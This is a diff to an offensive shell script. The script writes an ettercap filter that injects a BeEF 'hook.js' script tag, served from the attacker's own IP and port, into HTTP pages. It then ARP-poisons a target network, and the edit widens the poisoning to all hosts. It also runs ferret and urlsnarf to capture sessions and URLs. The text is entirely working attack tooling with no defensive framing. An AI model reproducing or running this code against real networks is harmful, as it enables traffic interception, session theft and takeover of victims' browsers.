@@ -52,18 +52,18 @@ fi
 echo 'if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
       replace("Accept-Encoding", "Accept-Hackers!"); 
-      msg("Bypassed Accept-Encoding!\n");
+      msg("Bypass: Accept-Encoding!\n");
    }
 }
 if (ip.proto == TCP && tcp.src == 80) {
    replace("</head>", "<script type="text/javascript" src="http://'"$IP"':'"$PORT"'/hook.js"> </script> </head>");
-   msg("JavaScript Injected!.\n");
+   msg("Beef Hook: '"$IP"':'"$PORT"'/hook.js Injected!\n");
 }' > etter.filter.jsinject
 
 xterm -e "ferret -i $NIC"&
 xterm -e "urlsnarf -i $NIC"&
 etterfilter etter.filter.jsinject -o jsinject.ef 2> /dev/null
 sleep 4 && echo " [*] Beef Hook: http://$IP:$PORT/hook.js" && echo " [*] Filter Activated, waiting for requests..." && echo " [*] Press 'q' to quit" && echo&
-ettercap -i $NIC -TqF jsinject.ef -M ARP /$TARG/ /$ROUTE/
+ettercap -i $NIC -TqF jsinject.ef -M ARP /$TARG/ //
 killall ferret
 killall urlsnarf
